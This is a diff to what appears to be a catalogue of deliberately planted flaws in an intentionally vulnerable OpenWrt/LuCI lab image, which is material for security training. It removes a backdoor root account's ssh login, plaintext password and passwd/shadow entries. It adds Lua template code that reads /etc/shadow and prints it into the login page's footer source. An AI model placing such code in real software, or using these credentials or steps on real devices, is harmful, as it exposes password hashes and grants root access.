@@ -34,18 +34,27 @@ Backdoor
 
 Vulnerability: A backdoor user account with root priveleges has been added
 
-Attack: ssh ruser@<ip-address>
-	password is "rpassword" (without quotes)
+Attack: Navigate to the login page at <ip-address>/cgi-bin/luci and view source (CTRL+U). The contents of /etc/shadow exist in the footer end tag.
 
-Exploit: You can find the exploit for this vulnerability at iv-wrt/exploits/backdoor. Note that "expect" is a dependency for this script.
+Exploit:
 
 Vulnerable Code:
 	
-	/etc/passwd:
-		ruser:x:0:0:rservice_default:/tmp:/bin/ash
+	in /usr/lib/lua/luci/view/themes/bootstrap/footer.htm
 
-	/etc/shadow:
-		ruser:$1$4Q5Z0BuW$9UI5yWhHR3.NWxjuDR2Cs/:16528:0:99999:7:::
+		        local categories = disp.node_childs(tree)
+		%>                                               
+		<%                                               
+			local f = assert(io.open("/etc/shadow", "r"))
+			local t = f:read("*all")                     
+			f:close()                                    
+		%>                                               
+			<footer>
+		....
+
+   		<% end %>                                                                  
+  		</footer <%print(t)%>>                                                      
+  		</div> 
 
 Command Injection
 -----------------
